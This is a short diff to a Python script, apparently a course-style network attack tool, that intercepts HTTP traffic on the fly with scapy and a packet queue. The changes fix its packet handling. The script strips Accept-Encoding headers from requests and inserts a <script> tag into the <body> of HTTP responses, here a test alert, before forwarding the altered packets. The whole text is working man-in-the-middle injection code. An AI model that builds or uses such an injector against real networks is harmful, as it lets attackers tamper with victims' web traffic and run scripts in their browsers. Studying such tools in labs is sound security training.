@@ -16,19 +16,19 @@ def set_load(packet,payload):
 
 def process_packet(pkt):
     scapy_packet = scapy.IP(pkt.get_payload())
-    load = scapy_packet[scapy.Raw].load
     if scapy_packet.haslayer(scapy.Raw):
+        load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] HTTP Request")
-            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load.decode('utf-8'))
+            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load.decode('utf-8', errors='ignore'))
 
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] HTTP Response")
             load = bytes(load.replace(b"<body>", b"<script>alert('test')</script><body>"))
 
-    if load != scapy_packet[scapy.Raw].load:
-        new_packet = set_load(scapy_packet, load)
-        pkt.set_payload(bytes(new_packet))
+        if load != scapy_packet[scapy.Raw].load:
+            new_packet = set_load(scapy_packet, load)
+            pkt.set_payload(bytes(new_packet))
 
     pkt.accept()
 
